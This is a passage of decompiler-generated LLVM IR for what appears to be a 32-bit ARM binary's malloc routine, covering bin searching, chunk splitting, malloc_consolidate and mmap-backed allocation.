  %v3_14340 = inttoptr i32 %v2_14340 to i32*
  store i32 %v0_14340, i32* %v3_14340, align 4
  %v0_14344 = load i32, i32* %r2.global-to-local, align 4
  %v1_14344 = load i32, i32* @r6, align 4
  %v2_14344 = add i32 %v1_14344, 12
  %v3_14344 = inttoptr i32 %v2_14344 to i32*
  store i32 %v0_14344, i32* %v3_14344, align 4
  %v0_14348 = load i32, i32* %lr.global-to-local, align 4
  %v1_14348 = load i32, i32* %r2.global-to-local, align 4
  %v3_14348 = add i32 %v1_14348, %v0_14348
  %v4_14348 = inttoptr i32 %v3_14348 to i32*
  store i32 %v0_14348, i32* %v4_14348, align 4
  %v0_1434c = load i32, i32* %r1.global-to-local, align 4
  %v1_1434c = load i32, i32* %r2.global-to-local, align 4
  %v2_1434c = add i32 %v1_1434c, 4
  %v3_1434c = inttoptr i32 %v2_1434c to i32*
  store i32 %v0_1434c, i32* %v3_1434c, align 4
  %v0_14350 = load i32, i32* @r6, align 4
  %v1_14350 = load i32, i32* %r2.global-to-local, align 4
  %v2_14350 = add i32 %v1_14350, 12
  %v3_14350 = inttoptr i32 %v2_14350 to i32*
  store i32 %v0_14350, i32* %v3_14350, align 4
  %v0_14354 = load i32, i32* @r6, align 4
  %v1_14354 = load i32, i32* %r2.global-to-local, align 4
  %v2_14354 = add i32 %v1_14354, 8
  %v3_14354 = inttoptr i32 %v2_14354 to i32*
  store i32 %v0_14354, i32* %v3_14354, align 4
  br label %dec_label_pc_148e8

dec_label_pc_14360:                               ; preds = %dec_label_pc_142c8, %dec_label_pc_142b8
  %v1_142f0 = phi i32 [ %storemerge.pre, %dec_label_pc_142b8 ], [ %v3_142d4, %dec_label_pc_142c8 ]
  store i32 %v1_142f0, i32* %ip.global-to-local, align 4
  %v9_14360 = icmp eq i32 %v1_142f0, %v1_142bc
  br i1 %v9_14360, label %dec_label_pc_14368.loopexit, label %dec_label_pc_142c8

dec_label_pc_14368.loopexit:                      ; preds = %dec_label_pc_14360
  br label %dec_label_pc_14368

dec_label_pc_14368:                               ; preds = %dec_label_pc_142b0.dec_label_pc_14368_crit_edge, %dec_label_pc_14368.loopexit
  %v4_14398.pre-phi = phi i32 [ %.pre203, %dec_label_pc_142b0.dec_label_pc_14368_crit_edge ], [ %v4_142b8, %dec_label_pc_14368.loopexit ]
  %v1_14368 = add i32 %v0_14368.pre, 1
  store i32 %v1_14368, i32* %r2.global-to-local, align 4
  %v1_1436c = urem i32 %v1_14368, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r0.global-to-local, align 4
  %v6_14378 = shl i32 1, %v1_1436c
  store i32 %v6_14378, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14380 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14380, i32* %r3.global-to-local, align 4
  %v3_14384 = udiv i32 %v1_14368, 32
  store i32 %v3_14384, i32* @r5, align 4
  %v4_14388 = mul nuw nsw i32 %v3_14384, 4
  %v5_14388 = add i32 %v4_14380, %v4_14388
  store i32 %v5_14388, i32* %r2.global-to-local, align 4
  %v1_1438c = add i32 %v5_14388, 820
  %v2_1438c = inttoptr i32 %v1_1438c to i32*
  %v3_1438c = load i32, i32* %v2_1438c, align 4
  store i32 %v3_1438c, i32* @r4, align 4
  %v1_14390 = add i32 %v4_14380, 52
  store i32 %v1_14390, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_14398 = add i32 %v1_14390, %v4_14398.pre-phi
  store i32 %v5_14398, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %dec_label_pc_14404, %dec_label_pc_14368
  %v1_143a4 = phi i32 [ %v1_143a4.pre, %dec_label_pc_14404 ], [ %v3_1438c, %dec_label_pc_14368 ]
  %v0_143a4 = phi i32 [ %v0_1439c.pre, %dec_label_pc_14404 ], [ %v6_14378, %dec_label_pc_14368 ]
  %v1_1439c = sub i32 1, %v0_143a4
  %v2_1439c = icmp ult i32 %v0_143a4, 2
  %v1_1439c. = select i1 %v2_1439c, i32 %v1_1439c, i32 0
  store i32 %v1_1439c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_143a4, %v1_143a4
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1439c
  %v5_143a8 = or i32 %v1_1439c., 1
  store i32 %v5_143a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_143b4.preheader

bb145:                                            ; preds = %dec_label_pc_1439c
  %v2_143ac = icmp eq i32 %v1_1439c., 0
  br i1 %v2_143ac, label %.dec_label_pc_143f0.preheader_crit_edge, label %dec_label_pc_143b4.preheader

.dec_label_pc_143f0.preheader_crit_edge:          ; preds = %bb145
  %v0_143e857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_143f0.preheader

dec_label_pc_143b4.preheader:                     ; preds = %bb145, %.thread15
  %v0_143b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %dec_label_pc_143b4.preheader, %dec_label_pc_143c0
  %v0_143b4 = phi i32 [ %v0_143b4.pre, %dec_label_pc_143b4.preheader ], [ %v1_143b4, %dec_label_pc_143c0 ]
  %v1_143b4 = add i32 %v0_143b4, 1
  store i32 %v1_143b4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_143b4, 2
  br i1 %tmp211, label %dec_label_pc_14494.loopexit, label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143b4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r3.global-to-local, align 4
  %v1_143c4 = load i32, i32* @r8, align 4
  %v2_143c4 = add i32 %v1_143c4, ptrtoint (i32* @global_var_24478.766 to i32)
  %v3_143c4 = inttoptr i32 %v2_143c4 to i32*
  %v4_143c4 = load i32, i32* %v3_143c4, align 4
  store i32 %v4_143c4, i32* %r2.global-to-local, align 4
  %v4_143c8 = mul i32 %v1_143b4, 4
  %v5_143c8 = add i32 %v4_143c4, %v4_143c8
  store i32 %v5_143c8, i32* %r3.global-to-local, align 4
  %v1_143cc = add i32 %v5_143c8, 820
  %v2_143cc = inttoptr i32 %v1_143cc to i32*
  %v3_143cc = load i32, i32* %v2_143cc, align 4
  store i32 %v3_143cc, i32* @r4, align 4
  %v2_143d0 = icmp eq i32 %v3_143cc, 0
  br i1 %v2_143d0, label %dec_label_pc_143b4, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143c0
  %v4_143d8 = mul i32 %v1_143b4, 256
  %v5_143d8 = add i32 %v4_143c4, %v4_143d8
  store i32 %v5_143d8, i32* %r3.global-to-local, align 4
  %v1_143dc = add i32 %v5_143d8, 44
  store i32 %v1_143dc, i32* %r0.global-to-local, align 4
  %v0_143e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_143e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143f0.preheader

dec_label_pc_143f0.preheader:                     ; preds = %.dec_label_pc_143f0.preheader_crit_edge, %dec_label_pc_143d8
  %v0_143e857 = phi i32 [ %v1_143dc, %dec_label_pc_143d8 ], [ %v0_143e857.pre, %.dec_label_pc_143f0.preheader_crit_edge ]
  %v0_1440c = phi i32 [ %v3_143cc, %dec_label_pc_143d8 ], [ %v1_143a4, %.dec_label_pc_143f0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_143e0, %dec_label_pc_143d8 ], [ %v0_143a4, %.dec_label_pc_143f0.preheader_crit_edge ]
  %v2_143f054 = and i32 %ip.promoted, %v0_1440c
  %v4_143f056 = icmp eq i32 %v2_143f054, 0
  br i1 %v4_143f056, label %dec_label_pc_143e8, label %dec_label_pc_143f8

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143f0.preheader, %dec_label_pc_143e8
  %v2_143ec59 = phi i32 [ %v2_143ec, %dec_label_pc_143e8 ], [ %ip.promoted, %dec_label_pc_143f0.preheader ]
  %v0_143e858 = phi i32 [ %v1_143e8, %dec_label_pc_143e8 ], [ %v0_143e857, %dec_label_pc_143f0.preheader ]
  %v1_143e8 = add i32 %v0_143e858, 8
  %v2_143ec = mul i32 %v2_143ec59, 2
  %v2_143f0 = and i32 %v2_143ec, %v0_1440c
  %v4_143f0 = icmp eq i32 %v2_143f0, 0
  br i1 %v4_143f0, label %dec_label_pc_143e8, label %dec_label_pc_143f0.dec_label_pc_143f8_crit_edge

dec_label_pc_143f0.dec_label_pc_143f8_crit_edge:  ; preds = %dec_label_pc_143e8
  store i32 %v1_143e8, i32* %r0.global-to-local, align 4
  store i32 %v2_143ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_143f8

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143f0.dec_label_pc_143f8_crit_edge, %dec_label_pc_143f0.preheader
  %v0_14418 = phi i32 [ %v2_143ec, %dec_label_pc_143f0.dec_label_pc_143f8_crit_edge ], [ %ip.promoted, %dec_label_pc_143f0.preheader ]
  %v0_1443c = phi i32 [ %v1_143e8, %dec_label_pc_143f0.dec_label_pc_143f8_crit_edge ], [ %v0_143e857, %dec_label_pc_143f0.preheader ]
  %v1_143f8 = add i32 %v0_1443c, 12
  %v2_143f8 = inttoptr i32 %v1_143f8 to i32*
  %v3_143f8 = load i32, i32* %v2_143f8, align 4
  store i32 %v3_143f8, i32* @lr, align 4
  %v9_143fc = icmp eq i32 %v3_143f8, %v0_1443c
  br i1 %v9_143fc, label %dec_label_pc_14404, label %dec_label_pc_14424

dec_label_pc_14404:                               ; preds = %dec_label_pc_143f8
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r0.global-to-local, align 4
  %v1_14408 = load i32, i32* @r8, align 4
  %v2_14408 = add i32 %v1_14408, ptrtoint (i32* @global_var_24478.766 to i32)
  %v3_14408 = inttoptr i32 %v2_14408 to i32*
  %v4_14408 = load i32, i32* %v3_14408, align 4
  %v2_1440c = sub i32 -1, %v0_14418
  %v3_1440c = and i32 %v0_1440c, %v2_1440c
  store i32 %v3_1440c, i32* @r4, align 4
  %v1_14410 = load i32, i32* @r5, align 4
  %v4_14410 = mul i32 %v1_14410, 4
  %v5_14410 = add i32 %v4_14410, %v4_14408
  store i32 %v5_14410, i32* %r3.global-to-local, align 4
  %v1_14414 = add i32 %v0_1443c, 8
  store i32 %v1_14414, i32* %r0.global-to-local, align 4
  %v2_14418 = mul i32 %v0_14418, 2
  store i32 %v2_14418, i32* %ip.global-to-local, align 4
  %v2_1441c = add i32 %v5_14410, 820
  %v3_1441c = inttoptr i32 %v2_1441c to i32*
  store i32 %v3_1440c, i32* %v3_1441c, align 4
  %v0_1439c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_143a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1439c

dec_label_pc_14424:                               ; preds = %dec_label_pc_143f8
  %v1_14424 = add i32 %v3_143f8, 4
  %v2_14424 = inttoptr i32 %v1_14424 to i32*
  %v3_14424 = load i32, i32* %v2_14424, align 4
  store i32 %v3_14424, i32* %r3.global-to-local, align 4
  %v1_14428 = and i32 %v3_14424, -4
  store i32 %v1_14428, i32* %r2.global-to-local, align 4
  %v0_1442c = load i32, i32* @sl, align 4
  %v2_1442c = sub i32 %v1_14428, %v0_1442c
  store i32 %v2_1442c, i32* %ip.global-to-local, align 4
  %v1_14430 = add i32 %v3_143f8, 12
  %v2_14430 = inttoptr i32 %v1_14430 to i32*
  %v3_14430 = load i32, i32* %v2_14430, align 4
  store i32 %v3_14430, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1442c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_14424
  %v6_14438 = add i32 %v1_14428, %v3_143f8
  store i32 %v6_14438, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_14424, %bb146
  %v2_1443c = add i32 %v3_14430, 8
  %v3_1443c = inttoptr i32 %v2_1443c to i32*
  store i32 %v0_1443c, i32* %v3_1443c, align 4
  %v0_14440 = load i32, i32* %r3.global-to-local, align 4
  %v1_14440 = load i32, i32* %r0.global-to-local, align 4
  %v2_14440 = add i32 %v1_14440, 12
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  store i32 %v0_14440, i32* %v3_14440, align 4
  %v4_14444 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_14320_crit_edge, label %dec_label_pc_14450

.dec_label_pc_14320_crit_edge:                    ; preds = %bb147
  %v5_14444 = add i32 %v4_14444, 8
  store i32 %v5_14444, i32* %r4.global-to-local, align 4
  %v4_14448 = load i32, i32* %r2.global-to-local, align 4
  %v5_14448 = add i32 %v4_14448, 4
  %v6_14448 = inttoptr i32 %v5_14448 to i32*
  %v7_14448 = load i32, i32* %v6_14448, align 4
  store i32 %v7_14448, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_14450:                               ; preds = %bb147
  %v1_14450 = load i32, i32* @sl, align 4
  %v2_14450 = add i32 %v1_14450, %v4_14444
  store i32 %v2_14450, i32* %r1.global-to-local, align 4
  %v1_14458 = load i32, i32* @r6, align 4
  %v2_14458 = add i32 %v1_14458, 8
  %v3_14458 = inttoptr i32 %v2_14458 to i32*
  store i32 %v2_14450, i32* %v3_14458, align 4
  %v0_1445c = load i32, i32* %r1.global-to-local, align 4
  %v1_1445c = load i32, i32* @r6, align 4
  %v2_1445c = add i32 %v1_1445c, 12
  %v3_1445c = inttoptr i32 %v2_1445c to i32*
  store i32 %v0_1445c, i32* %v3_1445c, align 4
  %v0_14460 = load i32, i32* @r6, align 4
  %v1_14460 = load i32, i32* %r1.global-to-local, align 4
  %v2_14460 = add i32 %v1_14460, 8
  %v3_14460 = inttoptr i32 %v2_14460 to i32*
  store i32 %v0_14460, i32* %v3_14460, align 4
  %v0_14464 = load i32, i32* @r6, align 4
  %v1_14464 = load i32, i32* %r1.global-to-local, align 4
  %v2_14464 = add i32 %v1_14464, 12
  %v3_14464 = inttoptr i32 %v2_14464 to i32*
  store i32 %v0_14464, i32* %v3_14464, align 4
  %tmp213 = icmp ult i32 %v1_14450, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_14450
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v8_14470 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v8_14470, i32* %r3.global-to-local, align 4
  %v4_14474 = load i32, i32* %r1.global-to-local, align 4
  %v6_14474 = add i32 %v8_14470, 48
  %v7_14474 = inttoptr i32 %v6_14474 to i32*
  store i32 %v4_14474, i32* %v7_14474, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_14450, %bb148
  %v0_14478 = load i32, i32* @sl, align 4
  %v1_14478 = or i32 %v0_14478, 1
  store i32 %v1_14478, i32* %r2.global-to-local, align 4
  %v0_1447c = load i32, i32* %ip.global-to-local, align 4
  %v1_1447c = or i32 %v0_1447c, 1
  store i32 %v1_1447c, i32* %r3.global-to-local, align 4
  %v0_14480 = load i32, i32* @lr, align 4
  %v1_14480 = add i32 %v0_14480, 8
  store i32 %v1_14480, i32* %r4.global-to-local, align 4
  %v2_14484 = add i32 %v0_14480, 4
  %v3_14484 = inttoptr i32 %v2_14484 to i32*
  store i32 %v1_14478, i32* %v3_14484, align 4
  %v0_14488 = load i32, i32* %ip.global-to-local, align 4
  %v1_14488 = load i32, i32* %r1.global-to-local, align 4
  %v3_14488 = add i32 %v1_14488, %v0_14488
  %v4_14488 = inttoptr i32 %v3_14488 to i32*
  store i32 %v0_14488, i32* %v4_14488, align 4
  %v0_1448c = load i32, i32* %r3.global-to-local, align 4
  %v1_1448c = load i32, i32* %r1.global-to-local, align 4
  %v2_1448c = add i32 %v1_1448c, 4
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  store i32 %v0_1448c, i32* %v3_1448c, align 4
  br label %dec_label_pc_148e8

dec_label_pc_14494.loopexit:                      ; preds = %dec_label_pc_143b4
  br label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14494.loopexit, %dec_label_pc_140a8, %dec_label_pc_140b0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  %v4_1449c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_1449c, i32* @r0, align 4
  %v1_144a0 = add i32 %v4_1449c, 44
  %v2_144a0 = inttoptr i32 %v1_144a0 to i32*
  %v3_144a0 = load i32, i32* %v2_144a0, align 4
  store i32 %v3_144a0, i32* %ip.global-to-local, align 4
  %v1_144a4 = add i32 %v3_144a0, 4
  %v2_144a4 = inttoptr i32 %v1_144a4 to i32*
  %v3_144a4 = load i32, i32* %v2_144a4, align 4
  %v0_144a8 = load i32, i32* @sl, align 4
  %v1_144a8 = add i32 %v0_144a8, 16
  store i32 %v1_144a8, i32* %r1.global-to-local, align 4
  %v1_144ac = and i32 %v3_144a4, -4
  store i32 %v1_144ac, i32* %r3.global-to-local, align 4
  %v3_144b0 = icmp ult i32 %v1_144ac, %v1_144a8
  br i1 %v3_144b0, label %dec_label_pc_144e0, label %dec_label_pc_144bc

dec_label_pc_144bc:                               ; preds = %dec_label_pc_14494
  %v2_144bc = sub i32 %v1_144ac, %v0_144a8
  %v2_144c0 = add i32 %v0_144a8, %v3_144a0
  store i32 %v2_144c0, i32* %r1.global-to-local, align 4
  %v1_144c4 = or i32 %v2_144bc, 1
  store i32 %v1_144c4, i32* %r3.global-to-local, align 4
  %v1_144c8 = or i32 %v0_144a8, 1
  store i32 %v1_144c8, i32* %r2.global-to-local, align 4
  %v1_144cc = add i32 %v3_144a0, 8
  store i32 %v1_144cc, i32* %r4.global-to-local, align 4
  store i32 %v1_144c8, i32* %v2_144a4, align 4
  %v0_144d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_144d4 = load i32, i32* @r0, align 4
  %v2_144d4 = add i32 %v1_144d4, 44
  %v3_144d4 = inttoptr i32 %v2_144d4 to i32*
  store i32 %v0_144d4, i32* %v3_144d4, align 4
  %v0_144d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_144d8 = add i32 %v1_144d8, 4
  %v3_144d8 = inttoptr i32 %v2_144d8 to i32*
  store i32 %v0_144d8, i32* %v3_144d8, align 4
  br label %dec_label_pc_148e8

dec_label_pc_144e0:                               ; preds = %dec_label_pc_14494
  %v1_144e0 = inttoptr i32 %v4_1449c to i32*
  %v2_144e0 = load i32, i32* %v1_144e0, align 4
  store i32 %v2_144e0, i32* %r3.global-to-local, align 4
  %v1_144e4 = and i32 %v2_144e0, 2
  store i32 %v1_144e4, i32* %ip.global-to-local, align 4
  %v2_144e4 = icmp eq i32 %v1_144e4, 0
  %v1_144e8 = add i32 %v4_1449c, 860
  %v2_144e8 = inttoptr i32 %v1_144e8 to i32*
  %v3_144e8 = load i32, i32* %v2_144e8, align 4
  store i32 %v3_144e8, i32* %r1.global-to-local, align 4
  br i1 %v2_144e4, label %dec_label_pc_14500, label %dec_label_pc_144f0

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144e0
  %v0_144f0 = call i32 @__malloc_consolidate()
  %v0_144f4 = load i32, i32* @sl, align 4
  %v1_144f4 = add i32 %v0_144f4, -7
  store i32 %v1_144f4, i32* @r0, align 4
  %v0_144f8 = call i32 @malloc()
  store i32 %v0_144f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148e4

dec_label_pc_14500:                               ; preds = %dec_label_pc_144e0
  %v1_14500 = add i32 %v4_1449c, 844
  %v2_14500 = inttoptr i32 %v1_14500 to i32*
  %v3_14500 = load i32, i32* %v2_14500, align 4
  store i32 %v3_14500, i32* %r3.global-to-local, align 4
  %v3_14504 = icmp ult i32 %v0_144a8, %v3_14500
  %v1_14508 = add i32 %v3_144e8, -1
  store i32 %v1_14508, i32* %sb.global-to-local, align 4
  br i1 %v3_14504, label %dec_label_pc_145dc, label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_14500
  %v1_14510 = add i32 %v4_1449c, 852
  %v2_14510 = inttoptr i32 %v1_14510 to i32*
  %v3_14510 = load i32, i32* %v2_14510, align 4
  store i32 %v3_14510, i32* %r2.global-to-local, align 4
  %v1_14514 = add i32 %v4_1449c, 848
  %v2_14514 = inttoptr i32 %v1_14514 to i32*
  %v3_14514 = load i32, i32* %v2_14514, align 4
  store i32 %v3_14514, i32* %r3.global-to-local, align 4
  %v6_1451c = icmp slt i32 %v3_14514, %v3_14510
  br i1 %v6_1451c, label %dec_label_pc_14520, label %dec_label_pc_145dc

dec_label_pc_14520:                               ; preds = %dec_label_pc_14510
  %v1_14520 = add i32 %v0_144a8, 10
  %v2_14524 = add i32 %v1_14520, %v3_144e8
  store i32 %v2_14524, i32* %r3.global-to-local, align 4
  %v2_14528 = sub i32 0, %v3_144e8
  %v3_14528 = and i32 %v2_14524, %v2_14528
  store i32 %v3_14528, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_14528, %v0_144a8
  br i1 %tmp214, label %dec_label_pc_14534, label %dec_label_pc_145dc

dec_label_pc_14534:                               ; preds = %dec_label_pc_14520
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_14528, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1454c = call i32 @mmap(i32 0, i32 %v3_14528, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1454c, i32* %r0.global-to-local, align 4
  %v7_14550 = icmp eq i32 %v6_1454c, -1
  br i1 %v7_14550, label %dec_label_pc_14534.dec_label_pc_145dc_crit_edge, label %dec_label_pc_14558

dec_label_pc_14534.dec_label_pc_145dc_crit_edge:  ; preds = %dec_label_pc_14534
  %v1_14600.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_145dc

dec_label_pc_14558:                               ; preds = %dec_label_pc_14534
  %v1_14558 = urem i32 %v6_1454c, 8
  store i32 %v1_14558, i32* %r2.global-to-local, align 4
  %v2_14558 = icmp eq i32 %v1_14558, 0
  br i1 %v2_14558, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_14558
  %v2_1455c = sub nsw i32 8, %v1_14558
  store i32 %v2_1455c, i32* %r3.global-to-local, align 4
  %v2_14560 = load i32, i32* @r4, align 4
  %v3_14560 = sub i32 %v2_14560, %v2_1455c
  %v3_14564 = add i32 %v2_1455c, %v6_1454c
  store i32 %v3_14564, i32* %lr.global-to-local, align 4
  %v2_1456c = or i32 %v3_14560, 2
  store i32 %v2_1456c, i32* %r2.global-to-local, align 4
  %v5_14574 = inttoptr i32 %v3_14564 to i32*
  store i32 %v2_1455c, i32* %v5_14574, align 4
  %v1_14578 = load i32, i32* %r2.global-to-local, align 4
  %v2_14578 = load i32, i32* %lr.global-to-local, align 4
  %v3_14578 = add i32 %v2_14578, 4
  %v4_14578 = inttoptr i32 %v3_14578 to i32*
  store i32 %v1_14578, i32* %v4_14578, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_14558
  store i32 %v6_1454c, i32* %lr.global-to-local, align 4
  %v1_1457050 = load i32, i32* @r4, align 4
  %v2_1457051 = or i32 %v1_1457050, 2
  store i32 %v2_1457051, i32* %r3.global-to-local, align 4
  %v3_1457c = inttoptr i32 %v6_1454c to i32*
  store i32 0, i32* %v3_1457c, align 4
  %v1_14580 = load i32, i32* %r3.global-to-local, align 4
  %v2_14580 = load i32, i32* %lr.global-to-local, align 4
  %v3_14580 = add i32 %v2_14580, 4
  %v4_14580 = inttoptr i32 %v3_14580 to i32*
  store i32 %v1_14580, i32* %v4_14580, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1458c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_1458c, i32* %ip.global-to-local, align 4
  %v1_14590 = add i32 %v4_1458c, 848
  %v2_14590 = inttoptr i32 %v1_14590 to i32*
  %v3_14590 = load i32, i32* %v2_14590, align 4
  store i32 %v3_14590, i32* %r3.global-to-local, align 4
  %v1_14594 = add i32 %v4_1458c, 856
  %v2_14594 = inttoptr i32 %v1_14594 to i32*
  %v3_14594 = load i32, i32* %v2_14594, align 4
  store i32 %v3_14594, i32* %r2.global-to-local, align 4
  %v1_14598 = add i32 %v3_14590, 1
  store i32 %v1_14598, i32* %r3.global-to-local, align 4
  %v7_145a0 = icmp sgt i32 %v1_14598, %v3_14594
  br i1 %v7_145a0, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_14598, i32* %v2_14594, align 4
  %v0_145a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_145a4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_145a4 = phi i32 [ %v4_1458c, %.thread30 ], [ %v1_145a4.pre, %bb150 ]
  %v0_145a4 = phi i32 [ %v1_14598, %.thread30 ], [ %v0_145a4.pre, %bb150 ]
  %v2_145a4 = add i32 %v1_145a4, 848
  %v3_145a4 = inttoptr i32 %v2_145a4 to i32*
  store i32 %v0_145a4, i32* %v3_145a4, align 4
  %v0_145a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_145a8 = add i32 %v0_145a8, 868
  %v2_145a8 = inttoptr i32 %v1_145a8 to i32*
  %v3_145a8 = load i32, i32* %v2_145a8, align 4
  store i32 %v3_145a8, i32* %r3.global-to-local, align 4
  %v1_145ac = add i32 %v0_145a8, 880
  %v2_145ac = inttoptr i32 %v1_145ac to i32*
  %v3_145ac = load i32, i32* %v2_145ac, align 4
  store i32 %v3_145ac, i32* %r2.global-to-local, align 4
  %v0_145b0 = load i32, i32* @r4, align 4
  %v2_145b0 = add i32 %v0_145b0, %v3_145a8
  store i32 %v2_145b0, i32* %r1.global-to-local, align 4
  %v1_145b4 = add i32 %v0_145a8, 872
  %v2_145b4 = inttoptr i32 %v1_145b4 to i32*
  %v3_145b4 = load i32, i32* %v2_145b4, align 4
  store i32 %v3_145b4, i32* %r3.global-to-local, align 4
  %v1_145bc = add i32 %v0_145a8, 884
  %v2_145bc = inttoptr i32 %v1_145bc to i32*
  %v3_145bc = load i32, i32* %v2_145bc, align 4
  store i32 %v3_145bc, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_145b0, %v3_145ac
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_145b0, i32* %v2_145ac, align 4
  %v0_145c4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_145c4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_145c4 = phi i32 [ %v0_145a8, %bb151 ], [ %v1_145c4.pre, %bb152 ]
  %v0_145c4 = phi i32 [ %v2_145b0, %bb151 ], [ %v0_145c4.pre, %bb152 ]
  %v2_145c4 = add i32 %v1_145c4, 868
  %v3_145c4 = inttoptr i32 %v2_145c4 to i32*
  store i32 %v0_145c4, i32* %v3_145c4, align 4
  %v0_145c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_145c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_145c8 = add i32 %v1_145c8, %v0_145c8
  store i32 %v2_145c8, i32* %r1.global-to-local, align 4
  %v1_145cc = load i32, i32* %r2.global-to-local, align 4
  %v0_145d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_145d0 = add i32 %v0_145d0, 8
  store i32 %v1_145d0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_145c8, %v1_145cc
  br i1 %tmp216, label %bb154, label %dec_label_pc_148e4

bb154:                                            ; preds = %bb153
  %v5_145d4 = load i32, i32* %ip.global-to-local, align 4
  %v6_145d4 = add i32 %v5_145d4, 884
  %v7_145d4 = inttoptr i32 %v6_145d4 to i32*
  store i32 %v2_145c8, i32* %v7_145d4, align 4
  br label %dec_label_pc_148e4

dec_label_pc_145dc:                               ; preds = %dec_label_pc_14520, %dec_label_pc_14500, %dec_label_pc_14534.dec_label_pc_145dc_crit_edge, %dec_label_pc_14510
  %v1_14600 = phi i32 [ %v1_14600.pre, %dec_label_pc_14534.dec_label_pc_145dc_crit_edge ], [ %v0_144a8, %dec_label_pc_14510 ], [ %v0_144a8, %dec_label_pc_14500 ], [ %v0_144a8, %dec_label_pc_14520 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  %v4_145e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_145e4, i32* %r3.global-to-local, align 4
  %v1_145e8 = add i32 %v4_145e4, 44
  %v2_145e8 = inttoptr i32 %v1_145e8 to i32*
  %v3_145e8 = load i32, i32* %v2_145e8, align 4
  store i32 %v3_145e8, i32* %r0.global-to-local, align 4
  %v1_145ec = add i32 %v4_145e4, 864
